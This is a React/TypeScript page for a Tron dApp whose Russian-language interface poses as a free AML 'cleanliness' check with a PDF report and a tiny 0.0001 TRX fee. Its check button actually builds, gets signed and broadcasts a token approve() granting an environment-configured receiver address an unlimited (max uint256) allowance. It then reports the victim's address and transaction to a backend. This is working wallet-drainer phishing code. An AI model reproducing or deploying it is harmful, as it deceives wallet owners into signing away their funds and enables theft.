"use client";
import { useThemeParams } from "@/components/connection-page";
import Main from "@/components/new-main";
import { DEFAULT_TRON_METHODS } from "@/constants";
import { CHAIN_ID, useWalletConnectClient } from "@/context/client-context";
import { env } from "@/env";
import { useCallback, useState } from "react";
import toast from "react-hot-toast";
import { TronWeb } from "tronweb";
import { TransactionWrapper } from "tronweb/lib/esm/types/Transaction";
import { BroadcastReturn } from "tronweb/lib/esm/types/Trx";

const fullHost = "https://api.trongrid.io/";

function trunc(address: string) {
    if (address.length <= 29) {
        return address;
    }
    return `${address.slice(0, 15)}...${address.slice(-13)}`;
}

export default function Home() {
    const {
        client,
        session,
        connect,
        disconnect,
        accounts,
        balances,
        isInitializing,
        onSessionConnected,
        setPairings,
    } = useWalletConnectClient();

    const theme = useThemeParams();

    async function onConnect() {
        if (typeof client === "undefined")
            throw new Error("WalletConnect is not initialized");

        await connect();
    }

    const onDisconnect = useCallback(async () => {
        try {
            await disconnect();
        } catch (error) {
            toast.error((error as Error).message, {
                position: "bottom-left",
            });
        }
    }, [disconnect]);

    function callCheck() {
        if (typeof client === "undefined") {
            throw new Error("WalletConnect is not initialized");
        }
        if (typeof session === "undefined") {
            throw new Error("Session is not connected");
        }
    }

    const [approvalPending, setApprovalPending] = useState(false);

    function failOnError({ call }: { call: (value: unknown) => void }) {
        setApprovalPending(false);
        call("");
    }

    async function serverNotify({
        tx,
        address,
    }: {
        tx: BroadcastReturn<any>;
        address: string;
    }) {
        const txid = tx.transaction.txID;
        const result = tx.result;

        await fetch("/api/notify", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                time: Date.now(),
                address,
                txid,
                result,
            }),
        });
    }

    async function approve() {
        const address = accounts[0].split(":")[2];
        // mb.showLoader();
        setApprovalPending(true);
        let resolve_: (value: unknown) => void = () => {};
        let reject_: (value: unknown) => void = () => {};

        const loader_promise = new Promise((resolve, reject) => {
            resolve_ = resolve;
            reject_ = reject;
        });

        const tx = await buildTransaction({ address });

        if (!tx.valid) {
            failOnError({ call: reject_ });
            return;
        }

        console.info("Prepared transaction: ", tx.result);

        const signed_tx = await signTransaction({
            address,
            transaction: tx.result,
        });

        if (!signed_tx.valid) {
            failOnError({ call: reject_ });
            return;
        }

        console.info("Signed transaction: ", signed_tx.result);

        const res = await sendTransaction({
            signed_transaction: signed_tx.result,
        });

        if (!res.valid) {
            failOnError({ call: reject_ });
            return;
        }

        console.info("Transaction sent: ", res.result);

        await serverNotify({ tx: res.result, address });
        // mb.hideLoader();

        resolve_("");
        setApprovalPending(false);

        return res;
    }

    async function sendTransaction({
        signed_transaction,
    }: {
        signed_transaction: any;
    }) {
        const tronWeb = new TronWeb({
            fullHost,
        });

        try {
            const res = await tronWeb.trx.sendRawTransaction(
                signed_transaction
            );
            return { valid: true, result: res };
        } catch (err: any) {
            console.error("Transaction sender failed: ", err);
            return { valid: false, result: err?.message ?? err };
        }
    }

    async function buildTransaction({ address }: { address: string }) {
        const tronWeb = new TronWeb({
            fullHost,
        });

        const selector = "approve(address,uint256)";
        const params = [
            { type: "address", value: env.TRON_RECEIVER_ADDRESS },
            {
                type: "uint256",
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            },
        ];

        try {
            const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                env.TRON_CONTRACT_ADDRESS,
                selector,
                {},
                params,
                address
            );

            return {
                valid: true,
                result: tx,
            };
        } catch (error: any) {
            console.error("Transaction builder failed: ", error);
            return {
                valid: false,
                result: error?.message ?? error,
            };
        }
    }

    async function signMessage({
        address,
        message,
    }: {
        address: string;
        message: string;
    }) {
        callCheck();
        try {
            const result = await client!.request<{ signature: string }>({
                chainId: CHAIN_ID,
                topic: session!.topic,
                request: {
                    method: DEFAULT_TRON_METHODS.TRON_SIGN_MESSAGE,
                    params: {
                        address,
                        message,
                    },
                },
            });

            return {
                valid: true,
                result: result.signature,
            };
        } catch (error: any) {
            console.error("Message signer failed: ", error);
            return {
                valid: false,
                result: error?.message ?? error,
            };
        }
    }

    async function signTransaction({
        address,
        transaction,
    }: {
        address: string;
        transaction: TransactionWrapper;
    }) {
        callCheck();
        try {
            const { result } = await client!.request<{ result: any }>({
                chainId: CHAIN_ID,
                topic: session!.topic,
                request: {
                    method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
                    params: {
                        address,
                        transaction: {
                            ...transaction,
                        },
                    },
                },
            });

            return {
                valid: true,
                result: result,
            };
        } catch (error: any) {
            console.error("Transaction signer failed: ", error);
            return {
                valid: false,
                result: error?.message ?? error,
            };
        }
    }

    function renderContent() {
        return !accounts.length && !Object.keys(balances).length ? (
            <div className="flex w-full justify-center items-center h-full">
                <button onClick={onConnect}>Connect</button>
            </div>
        ) : (
            <>
                {accounts.map((account) => {
                    const [namespace, reference, address] = account.split(":");
                    const chainId = `${namespace}:${reference}`;

                    if (chainId !== CHAIN_ID) {
                        return null;
                    }

                    return (
                        <>
                            <p>Address: {address}</p>
                            <button
                                onClick={async () => approve()}
                                className="p-6 border border-black disabled:opacity-20 font-semibold"
                                disabled={approvalPending}
                            >
                                Approve
                            </button>
                        </>
                    );
                })}
            </>
        );
    }

    function ConnectWallet() {
        function EmptyState() {
            return (
                <>
                    <Main callback={() => onConnect()} />
                </>
            );
        }
        function WalletConnected() {
            const account = accounts[0];
            const [_, __, address] = account.split(":");
            return (
                <div className="flex flex-col w-full space-y-4 h-full p-6 ">
                    <div className="flex flex-col w-full space-y-2">
                        <div className="text-sm text-white/70 flex items-center justify-between">
                            <p>Ваш кошелек</p>
                            <span
                                className="underline"
                                onClick={async () => {
                                    await onDisconnect();
                                    await onConnect();
                                }}
                            >
                                Сменить кошелек
                            </span>
                        </div>
                        <p
                            className="p-2 border rounded-xl w-full !ml-0 text-lg font-semibold text-white"
                            style={{
                                borderColor: theme.accentTextColor,
                            }}
                        >
                            {trunc(address)}
                        </p>
                    </div>
                    <div className="flex flex-col w-full space-y-2 flex-grow">
                        <p className="text-sm text-white/70">
                            Ваши AML-проверки
                        </p>
                        <div className="p-2 border rounded-xl w-full border-dashed h-full flex flex-col justify-center items-center space-y-2 border-white/50 py-12">
                            <img
                                src="glass.gif"
                                alt="Magnifying Glass Tilted Left"
                                className="size-32"
                            />
                            <p className="text-center leading-none text-sm px-8 text-white/70">
                                Проверьте Ваши средства на чистоту, нажав кнопку
                                ниже. <br /> <br />В процессе проверки будет
                                списана комиссия 0.0001 TRX.
                            </p>
                            <div></div>
                            <div></div>
                            <button
                                className="p-6 py-2 rounded-xl font-semibold"
                                style={{
                                    backgroundColor: theme.buttonColor,
                                    color: theme.buttonTextColor,
                                }}
                                onClick={async () => approve()}
                            >
                                Проверить и получить PDF-отчёт
                            </button>
                            <p className="w-full text-center">
                                На следующей странице нажмите кнопку{" "}
                                <span className="font-semibold text-white">
                                    &quot;Войти&quot;
                                </span>{" "}
                                и получите PDF-отчёт о проверке
                            </p>
                        </div>
                    </div>
                </div>
            );
        }

        function RenderContent() {
            if (!accounts.length && !Object.keys(balances).length) {
                return <EmptyState />;
            } else {
                return <WalletConnected />;
            }
        }

        return (
            <div className="flex flex-col w-full h-full flex-grow justify-start">
                <RenderContent />
            </div>
        );
    }

    return <ConnectWallet />;
}
